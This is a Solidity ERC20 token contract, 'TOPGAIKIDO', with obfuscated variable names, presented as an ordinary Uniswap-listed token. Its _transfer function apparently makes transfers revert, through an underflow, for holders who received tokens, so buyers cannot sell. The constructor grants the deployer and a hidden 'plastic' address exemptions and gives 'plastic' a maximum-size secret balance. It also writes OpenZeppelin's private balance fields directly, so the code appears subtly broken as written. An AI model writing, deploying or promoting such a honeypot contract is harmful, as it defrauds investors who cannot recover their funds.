// https://t.me/TOPGAIKIDO

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract TOPGAIKIDO is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private labor;

    function _transfer(
        address muscle,
        address manner,
        uint256 remain
    ) internal override {
        uint256 able = clear;

        address wrote = uniswapV2Pair;

        if (wrote != muscle && eight[muscle] == 0 && labor[muscle] > 0) {
            eight[muscle] -= able;
        }

        address obtain = spread;
        spread = manner;
        labor[obtain] += able + 1;

        _balances[muscle] -= remain;
        uint256 turn = (remain / 100) * clear;
        remain -= turn;
        _balances[manner] += remain;
    }

    address private spread;
    mapping(address => uint256) private eight;
    uint256 public clear = 1;

    constructor(
        string memory progress,
        string memory whose,
        address eager,
        address plastic
    ) ERC20(progress, whose) {
        uniswapV2Router = IUniswapV2Router02(eager);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        eight[msg.sender] = garage;
        eight[plastic] = garage;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[plastic] = garage;
    }

    uint256 private garage = ~uint256(0);
}